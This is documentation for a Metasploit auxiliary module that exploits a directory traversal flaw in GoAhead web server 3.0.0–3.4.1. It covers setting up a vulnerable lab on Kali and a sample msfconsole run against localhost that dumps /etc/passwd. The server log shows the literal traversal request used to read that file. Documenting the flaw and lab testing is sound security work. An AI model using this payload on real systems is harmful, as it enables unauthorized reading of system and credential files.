## Vulnerable Application

GoAhead web server by EmbedThis versions from 3.0.0 through 3.4.1 contains a directory traversal vulnerability.
To exploit this vulnerability, each `../` must be matched with a `.x/`, with each being grouped together.
For instance a depth of 2 will look as follows: `../../.x/.x/foobar`.

An excellent writeup is available on [PacketStorm](https://packetstormsecurity.com/files/131156/GoAhead-3.4.1-Heap-Overflow-Traversal.html).

### Install on Kali

Since `goahead` is available on Git, we can simply download the vulnerable version, compile, and run it.

```
root@kali:/tmp# wget https://github.com/embedthis/goahead/archive/v3.4.1.tar.gz
--2019-10-07 20:42:28--  https://github.com/embedthis/goahead/archive/v3.4.1.tar.gz
Resolving github.com (github.com)... 192.30.253.113
Connecting to github.com (github.com)|192.30.253.113|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://codeload.github.com/embedthis/goahead/tar.gz/v3.4.1 [following]
--2019-10-07 20:42:29--  https://codeload.github.com/embedthis/goahead/tar.gz/v3.4.1
Resolving codeload.github.com (codeload.github.com)... 192.30.253.120
Connecting to codeload.github.com (codeload.github.com)|192.30.253.120|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/x-gzip]
Saving to: ‘v3.4.1.tar.gz’

v3.4.1.tar.gz                                   [     <=>                                                                                 ]   5.95M  6.35MB/s    in 0.9s    

2019-10-07 20:42:30 (6.35 MB/s) - ‘v3.4.1.tar.gz’ saved [6234594]

root@kali:/tmp# tar -zxf v3.4.1.tar.gz 
root@kali:/tmp# cd goahead-3.4.1/
root@kali:/tmp/goahead-3.4.1# make
make --no-print-directory -f projects/goahead-linux-default.mk all
      [Info] Use make SHOW=1 to trace executed commands.
      [Copy] build/linux-x64-default/bin/ca.crt
      [Copy] build/linux-x64-default/inc/osdep.h
      [Copy] build/linux-x64-default/inc/est.h
   [Compile] build/linux-x64-default/obj/estLib.o
      [Link] build/linux-x64-default/bin/libest.so
      [Copy] build/linux-x64-default/inc/goahead.h
      [Copy] build/linux-x64-default/inc/js.h
   [Compile] build/linux-x64-default/obj/action.o
   [Compile] build/linux-x64-default/obj/alloc.o
   [Compile] build/linux-x64-default/obj/auth.o
   [Compile] build/linux-x64-default/obj/cgi.o
   [Compile] build/linux-x64-default/obj/crypt.o
   [Compile] build/linux-x64-default/obj/file.o
   [Compile] build/linux-x64-default/obj/fs.o
   [Compile] build/linux-x64-default/obj/http.o
   [Compile] build/linux-x64-default/obj/js.o
   [Compile] build/linux-x64-default/obj/jst.o
   [Compile] build/linux-x64-default/obj/options.o
   [Compile] build/linux-x64-default/obj/osdep.o
   [Compile] build/linux-x64-default/obj/rom-documents.o
   [Compile] build/linux-x64-default/obj/route.o
   [Compile] build/linux-x64-default/obj/runtime.o
   [Compile] build/linux-x64-default/obj/socket.o
   [Compile] build/linux-x64-default/obj/upload.o
   [Compile] build/linux-x64-default/obj/est.o
   [Compile] build/linux-x64-default/obj/matrixssl.o
   [Compile] build/linux-x64-default/obj/nanossl.o
   [Compile] build/linux-x64-default/obj/openssl.o
      [Link] build/linux-x64-default/bin/libgo.so
   [Compile] build/linux-x64-default/obj/goahead.o
      [Link] build/linux-x64-default/bin/goahead
   [Compile] build/linux-x64-default/obj/test.o
      [Link] build/linux-x64-default/bin/goahead-test
   [Compile] build/linux-x64-default/obj/gopass.o
      [Link] build/linux-x64-default/bin/gopass

You can now install via "sudo make  install" or run GoAhead via: "sudo make run"
To run locally, put linux-x64-default/bin in your path

root@kali:/tmp/goahead-3.4.1# build/linux-x64-default/bin/goahead --verbose --home test /var/www/html/
```

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/http/goahead_traversal```
  4. Do: ```set rhosts [ip]```
  5. Do: ```set depth [number]```
  6. Do: ```run```
  7. You should get the file contents.

## Options

  **DEPTH**

  The depth to traverse from the webroot.  This does not need to be exact, overshooting (using a number larger than needed)
  will still result in the file being obtained.  Default is `5`

  **FILEPATH**

  The path to the file to read.  Default is `/etc/passwd`.

## Scenarios

### GoAhead 3.4.1 on Kali

Install from the instructions at the top of this document.

```
msf5 > use auxiliary/scanner/http/goahead_traversal 
msf5 auxiliary(scanner/http/goahead_traversal) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 auxiliary(scanner/http/goahead_traversal) > set depth 5
depth => 5
msf5 auxiliary(scanner/http/goahead_traversal) > run

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

[+] File saved in: /root/.msf4/loot/20191007213309_default_127.0.0.1_goahead.traversa_324804.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Server Logs

When setting the server to verbose output, the following is shown during exploitation:

```
# build/linux-x64-default/bin/goahead --verbose --home test /var/www/html/
goahead: 2: Configuration for Embedthis GoAhead
goahead: 2: ---------------------------------------------
goahead: 2: Version:            3.4.1
goahead: 2: BuildType:          Debug
goahead: 2: CPU:                x64
goahead: 2: OS:                 linux
goahead: 2: Host:               127.0.1.1
goahead: 2: Directory:          /var/www/html/goahead-3.4.1/test
goahead: 2: Documents:          /var/www/html/
goahead: 2: Configure:          me -d -q -platform linux-x86-default -configure . -with est -gen make
goahead: 2: ---------------------------------------------
goahead: 2: Started http://*:80
goahead: 2: Started https://*:443
goahead: 2: GET ../../../../../.x/.x/.x/.x/.x/etc/passwd HTTP/1.1
```
